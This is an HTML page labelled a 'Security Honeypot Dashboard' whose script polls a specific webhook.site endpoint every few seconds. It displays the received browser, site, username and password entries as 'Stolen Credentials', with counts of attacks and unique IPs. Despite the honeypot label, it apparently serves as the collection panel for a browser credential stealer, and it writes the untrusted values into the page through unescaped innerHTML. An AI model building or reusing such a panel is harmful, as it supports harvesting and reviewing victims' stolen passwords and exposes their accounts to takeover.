<!DOCTYPE html>
<html>
<head>
    <title>🎯 Honeypot Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: white;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .header h1 {
            color: #667eea;
            margin: 0;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .stat h3 {
            color: #999;
            margin: 0 0 10px 0;
            font-size: 12px;
            text-transform: uppercase;
        }
        .stat .number {
            font-size: 2.5em;
            color: #667eea;
            font-weight: bold;
            margin: 0;
        }
        .content {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .creds {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background: #f9f9f9;
            padding: 20px;
            border-radius: 10px;
            border-left: 5px solid #ff6b6b;
        }
        .card .label {
            color: #999;
            font-size: 12px;
            text-transform: uppercase;
            margin-bottom: 5px;
        }
        .card .value {
            color: #333;
            font-size: 14px;
            background: white;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
            word-break: break-all;
            font-family: monospace;
        }
        .loading {
            text-align: center;
            color: #999;
            padding: 40px;
        }
        @media (max-width: 768px) {
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            .creds {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 Security Honeypot Dashboard</h1>
            <p>Real-time Credential Theft Detection</p>
        </div>

        <div class="stats">
            <div class="stat">
                <h3>Total Attacks</h3>
                <p class="number" id="attacks">0</p>
            </div>
            <div class="stat">
                <h3>Credentials Stolen</h3>
                <p class="number" id="creds">0</p>
            </div>
            <div class="stat">
                <h3>Unique IPs</h3>
                <p class="number" id="ips">0</p>
            </div>
            <div class="stat">
                <h3>Last Update</h3>
                <p class="number" id="time" style="font-size: 1.2em;">--:--</p>
            </div>
        </div>

        <div class="content">
            <h2>💾 Stolen Credentials</h2>
            <div id="creds-container" class="loading">Loading...</div>
        </div>
    </div>

    <script>
        const WEBHOOK_ID = "5800b3f8-197b-4244-9074-3333c54c2dd6";
        const API_URL = `https://webhook.site/token/${WEBHOOK_ID}/requests`;

        async function loadData() {
            try {
                const response = await fetch(API_URL);
                const data = await response.json();
                
                if (data.data && data.data.length > 0) {
                    let totalCreds = 0;
                    let uniqueIPs = new Set();
                    const container = document.getElementById('creds-container');
                    container.innerHTML = '';

                    data.data.forEach(req => {
                        try {
                            const body = JSON.parse(req.content);
                            totalCreds += body.credentials_count || 0;
                            uniqueIPs.add(req.ip);

                            if (body.credentials && Array.isArray(body.credentials)) {
                                body.credentials.forEach(cred => {
                                    const card = document.createElement('div');
                                    card.className = 'card';
                                    card.innerHTML = `
                                        <div class="label">${cred.browser}</div>
                                        <div class="label">Website</div>
                                        <div class="value">${cred.url}</div>
                                        <div class="label">Username</div>
                                        <div class="value">${cred.username}</div>
                                        <div class="label">Password</div>
                                        <div class="value">${cred.password || '[ENCRYPTED]'}</div>
                                    `;
                                    container.appendChild(card);
                                });
                            }
                        } catch (e) {}
                    });

                    document.getElementById('attacks').textContent = data.data.length;
                    document.getElementById('creds').textContent = totalCreds;
                    document.getElementById('ips').textContent = uniqueIPs.size;
                    document.getElementById('time').textContent = new Date().toLocaleTimeString();
                }
            } catch (error) {
                console.log('Error fetching data');
            }
        }

        // Загрузить сразу
        loadData();

        // Обновлять каждые 5 секунд
        setInterval(loadData, 5000);
    </script>
</body>
</html>
